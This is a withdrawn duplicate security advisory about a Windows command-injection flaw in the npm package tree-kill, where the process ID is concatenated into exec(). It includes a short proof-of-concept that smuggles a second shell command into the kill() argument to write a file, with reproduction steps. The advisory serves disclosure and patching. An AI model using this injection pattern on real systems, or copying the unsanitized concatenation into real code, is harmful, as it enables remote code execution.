  Duplicate Advisory: tree-kill vulnerable to remote code execution
  ## Duplicate Advisory
  This advisory has been withdrawn because it is a duplicate of GHSA-884p-74jh-xrg2. Ths link is maintained to preserve external references.

  ## Original Description
  A Code Injection exists in tree-kill on Windows which allows a remote code execution when an attacker is able to control the input into the command, which is executed without any check. The issue arises here: `https://github.com/pkrumins/node-tree-kill/blob/master/index.js#L20` . While the Linux part is sanitized, the Windows on simply uses the `+` operand to concatenate the input into `exec()`

  ### Steps To Reproduce:

  Create the following PoC file:

  ```js
  // poc.js
  var kill = require('tree-kill');
  kill('3333332 & echo "HACKED" > HACKED.txt & ');
  ```
  Execute the following commands in another terminal:

  ```bash
  npm i tree-kill # Install affected module
  dir # Check *HACKED.txt* doesn't exist
  node poc.js #  Run the PoC
  dir # Now *HACKED.txt* exists :)
  ```

  A new file called `HACKED.txt` will be created, containing the `HACKED` string.
